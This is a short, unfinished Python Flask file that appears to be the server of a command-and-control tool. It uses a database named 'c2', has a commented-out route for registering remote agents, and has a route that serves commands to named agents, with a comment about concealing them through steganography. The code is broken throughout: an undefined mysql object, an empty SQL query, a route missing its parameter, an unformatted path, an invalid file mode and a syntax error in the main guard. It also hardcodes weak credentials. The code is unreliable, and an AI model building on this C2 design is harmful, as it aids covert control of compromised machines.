import sys
import os
from flask import Flask, render_template

app = Flask(__name__)
app.secret_key = 'secret'

app.config['MYSQL_DATABASE_USER'] = 'root'
app.config['MYSQL_DATABASE_PASSWORD'] = '1234'
app.config['MYSQL_DATABASE_DB'] = 'c2'
app.config['MYSQL_DATABASE_HOST'] = 'localhost'
mysql.init_app(app)

#mysql = MySQL(app)
login_manager = flask_login.LoginManager()#dont think we need this
login_manager.init_app(app)#not needed 

conn = mysql.connect()
cursor = conn.cursor()
#CHANGE FOR OUR DATABASES
cursor.execute("SELECT ")
users = cursor.fetchall()


@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')


# @app.route("/registeragent", methods=['POST'])
#     def registerAgent():
#         name = flask.request.form.get("name")
#         remoteip = flask.request.remote_addr #gets ip automatically from request
#         #hostname?
#         #Type = flask.request.form.get("type")
#         #print("Welcome registered Agent: {}".format(name))
#         #add all agent data into a database
#         message = "You have been registered {}!".format(name)
#         #return(message, 200)#??

@app.route("/commands/<name>", methods=['GET'])
def runCommands():
    if os.path.exists("self.agentsPath/{name}/tasks"):
        try:
            file = open("[][]/commands","read")#NOTE: change to match steganography
            commands = file.read()
        except:
            print("Unable to Read file")
            
    else:
        render_template('command', message ="")


if __name__ = "__main__":
    app.run()
